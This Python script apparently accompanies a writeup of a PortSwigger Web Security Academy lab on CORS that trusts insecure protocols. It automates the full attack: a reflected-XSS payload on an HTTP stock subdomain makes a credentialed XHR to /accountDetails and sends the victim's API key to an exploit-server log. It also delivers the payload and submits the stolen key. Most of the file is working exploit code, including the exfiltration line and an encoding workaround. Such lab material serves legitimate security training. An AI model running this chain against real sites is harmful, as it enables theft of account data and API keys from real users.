#!/usr/bin/env python3
"""
CORS vulnerability with trusted insecure protocols
PortSwigger Web Security Academy -- CORS

Companion script for the writeup: 03-trusted-insecure-protocols.md

What this does:
    Confirms the HTTPS target trusts an http://stock.<lab-host> origin in its
    CORS config (ACAO reflects it, ACAC: true), then chains that with a
    reflected XSS on the stock subdomain's productId parameter. The delivered
    page redirects the victim to the XSS on the HTTP subdomain; the injected
    script runs from that trusted origin, performs a credentialed XHR to
    /accountDetails, and ships the stolen API key to the exploit server log.

    Two constraints from the target itself, preserved exactly as we found
    them: the stock endpoint only renders the HTML error page (where the XSS
    lives) when &storeId= is present -- without it you get a JSON error
    instead. And the injected JavaScript cannot use a literal '+' for string
    concatenation, because the payload travels through a URL encode/decode
    round-trip and the server decodes '+' back into a space, breaking the
    script. We use .concat() instead of '+' to survive that round-trip --
    PortSwigger's own official solution hits the same problem and fixes it
    differently, by URL-encoding the '+' as %2b instead (see the writeup's
    comparison section).

Usage:
    python 03-trusted-insecure-protocols.py <lab-url>
    e.g. python 03-trusted-insecure-protocols.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install websockets   # optional fallback if the exploit server URL
                              # isn't on the lab homepage (rare)
"""

from __future__ import annotations

import re
import sys
import time
from urllib.parse import unquote, urlparse

import httpx


def _get_exploit_server_url(client: httpx.Client) -> str | None:
    """Find the exploit server URL from the lab page (falls back to the
    lab's WebSocket academyLabHeader if it isn't printed on the homepage)."""
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    if m:
        return m.group(1).rstrip("/")

    base = str(client.base_url).rstrip("/")
    ws_url = base.replace("https://", "wss://").replace("http://", "ws://") + "/academyLabHeader"
    try:
        import websockets.sync.client as ws_sync
        with ws_sync.connect(ws_url, close_timeout=5) as ws:
            data = ws.recv(timeout=5)
            m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', str(data))
            if m:
                return m.group(1).rstrip("/")
    except Exception:
        pass
    return None


def _login(client: httpx.Client, username: str = "wiener", password: str = "peter") -> None:
    r = client.get("/login")
    csrf = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    token = csrf.group(1) if csrf else ""
    client.post("/login", data={"csrf": token, "username": username, "password": password})
    print(f"[*] Logged in as {username}")


def _detect_subdomain_trust(client: httpx.Client, url: str, http_stock: str) -> tuple[bool, bool]:
    """Probe /accountDetails with Origin set to the HTTP stock subdomain and
    report whether it's reflected in ACAO and whether credentials are
    allowed."""
    r = client.get(url, headers={"Origin": http_stock})
    acao = r.headers.get("access-control-allow-origin", "")
    acac = r.headers.get("access-control-allow-credentials", "").lower() == "true"
    return acao == http_stock, acac


def _exploit_server_deliver(exploit_url: str, body_html: str) -> None:
    """Store the PoC on the exploit server, then deliver it to the victim."""
    with httpx.Client(follow_redirects=True, timeout=15, verify=False) as c:
        head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit",
            "responseHead": head, "responseBody": body_html, "formAction": "STORE",
        })
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit",
            "responseHead": head, "responseBody": body_html, "formAction": "DELIVER_TO_VICTIM",
        })
        print("[*] Exploit delivered to victim")


def _get_exploit_server_log(exploit_url: str) -> str:
    with httpx.Client(follow_redirects=True, timeout=15, verify=False) as c:
        return c.get(exploit_url + "/log").text


def _submit_solution(client: httpx.Client, answer: str) -> None:
    r = client.get("/")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = csrf_match.group(1) if csrf_match else ""
    client.post("/submitSolution", data={"csrf": csrf, "answer": answer})
    print(f"[*] Submitted solution: {answer}")


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=15, verify=False)

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found")
        return
    print(f"[*] Exploit server: {exploit_url}")

    _login(client)

    # Confirm a product page exists (this is how we originally located the
    # stock-check surface, even though the exploit itself hardcodes
    # productId=1, which every lab instance has).
    r = client.get("/")
    prod_match = re.search(r'href="(/product\?productId=\d+)"', r.text)
    if not prod_match:
        print("[-] No product found")
        return
    product_path = prod_match.group(1)
    print(f"[*] Found product: {product_path}")

    r = client.get(product_path)
    stock_match = re.search(r'(https?://stock\.[^\s"\'<>]+)', r.text)
    if not stock_match:
        stock_match = re.search(
            r'src=["\']?(https?://[a-z]+\.' + re.escape(urlparse(lab_url).hostname) + r'[^\s"\'<>]*)',
            r.text,
        )
    if not stock_match:
        stock_match = re.search(r'fetch\(["\']([^"\']+stock[^"\']*)', r.text)

    parsed = urlparse(lab_url)
    http_stock = f"http://stock.{parsed.hostname}"
    trusts_subdomain, allows_creds = _detect_subdomain_trust(
        client, f"{lab_url}/accountDetails", http_stock
    )
    print(f"[*] Trusts HTTP subdomain ({http_stock}): {trusts_subdomain}")
    print(f"[*] Allows credentials: {allows_creds}")

    # productId is the reflected-XSS sink; storeId must be present or the
    # endpoint returns JSON instead of the HTML error page the XSS lives in.
    xss_subdomain_url = f"http://stock.{parsed.hostname}/?productId=1"

    # CRITICAL: no literal '+' in this JS -- the payload round-trips through
    # a URL decode on the server and '+' becomes a space, breaking the
    # script. .concat() avoids '+' entirely.
    cors_js = (
        "var req=new XMLHttpRequest();"
        "req.onload=function(){location='" + exploit_url + "/log?key='.concat(this.responseText)};"
        "req.open('GET','" + lab_url + "/accountDetails',true);"
        "req.withCredentials=true;"
        "req.send();"
    )
    # %3c/script> keeps the injected closing tag from prematurely closing the
    # outer exploit-server <script> block; storeId=1 must come after it.
    xss_url = f"{xss_subdomain_url}<script>{cors_js}%3c/script>&storeId=1"
    html = (
        '<script>\n'
        f"  document.location = \"{xss_url}\";\n"
        '</script>'
    )
    print("[*] Technique: CORS insecure protocol: XSS on HTTP subdomain -> credentialed CORS to HTTPS")
    _exploit_server_deliver(exploit_url, html)
    time.sleep(8)

    log = _get_exploit_server_log(exploit_url)
    decoded_log = unquote(log)
    api_key_match = re.search(r'"apikey"\s*:\s*"([^"]+)"', decoded_log)

    if api_key_match:
        api_key = api_key_match.group(1)
        print(f"[+] Stolen API key: {api_key}")
        _submit_solution(client, api_key)
    else:
        print("[-] Could not find API key in log")
        print(f"[*] Log (first 500 chars): {decoded_log[:500]}")

    time.sleep(2)
    check = client.get("/")
    solved = "congratulations" in check.text.lower()
    print(f"[+] Solved: {solved}")
    client.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
